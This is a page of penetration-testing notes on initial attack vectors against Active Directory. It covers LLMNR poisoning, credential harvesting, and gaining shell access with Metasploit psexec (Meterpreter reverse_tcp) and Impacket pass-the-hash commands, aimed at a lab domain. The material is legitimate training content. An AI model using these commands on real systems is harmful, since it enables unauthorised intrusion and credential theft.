# Initial Attack Vectors

## Starting Position and Goals

The starting position for this step is typically an attacker on the internal network either physically connected or via VPN with no valid credentials. At this point, the attacker can observe network traffic, scan for hosts and services, and attempt to exploit weak protocols, misconfigurations, or default credentials. Essentially, they are outside the trust boundary of critical systems but inside the network perimeter.

The goal of this step is to gain an initial foothold: obtain valid credentials (passwords or NTLM hashes) and access at least one machine. This foothold allows the attacker to interact with the network, establish persistence, and set up the conditions for lateral movement and privilege escalation toward higher-value targets, such as domain controllers or sensitive servers.

## Methodology

- Start with LLMNR/NBT-NS poisoning: Run Responder or MIMT6 to capture broadcast authentication requests.

- Generate network traffic: Conduct internal scans (e.g., Nessus) to provoke devices into authenticating.

- Perform web reconnaissance: Identify internal websites and services, check server types, versions, and exposed endpoints.

- Check for default or weak credentials: Test printers, Jenkins, or other internal management interfaces.

- Harvest credentials: Collect NTLM hashes or cleartext passwords captured via poisoning or web logins.

- Think creatively: Look for overlooked services, legacy protocols, or unconventional access points.

- Document and escalate: Keep track of captured credentials, systems accessed, and potential paths for privilege escalation.

Common intial attack vectors in Active Directory environments:

```{toctree}
:maxdepth: 1

llmnr-poisoning
smb-relay
ipv6-attacks
passback-attacks
```

## Gaining Shell Access

Once an attacker has captured or cracked hashes, they can leverage them to gain shell access on remote machines, either with the cleartext password or directly using the NTLM hash. Tools like Metasploit and Impacket facilitate this process, often using SMB-based execution techniques.

With Metasploit, the psexec module allows an attacker to authenticate to a remote Windows host using a username/password pair or a captured LM:NT hash. The workflow involves setting the target host (rhosts), domain (smbdomain), user (smbuser), and either the password (smbpass) or hash (smbpass LM:NT hash). Once the module runs, it can spawn a Meterpreter session, giving interactive shell access. Using hashes enables “pass-the-hash” attacks, bypassing the need to crack the password.

```
msfconsole

> search psexec

> use exploit/windows/smb/psexec

> set payload windows/x64/meterpreter/reverse_tcp

> set rhosts 10.0.2.16
> set smbdomain MARVEL.local
> set smbuser fcastle
> set smbpass Password1!

> run
```

Using Impacket, similar functionality is available with scripts like psexec.py, wmiexec.py, or smbexec.py. These tools allow authentication with a password or LM:NT hash to remotely execute commands or spawn a shell.

```
impacket-psexec MARVEL/fcastle:'Password1!'@10.0.2.16
```

```
impacket-psexec administrator@<target-ip> -hashes <LM:NT>
```
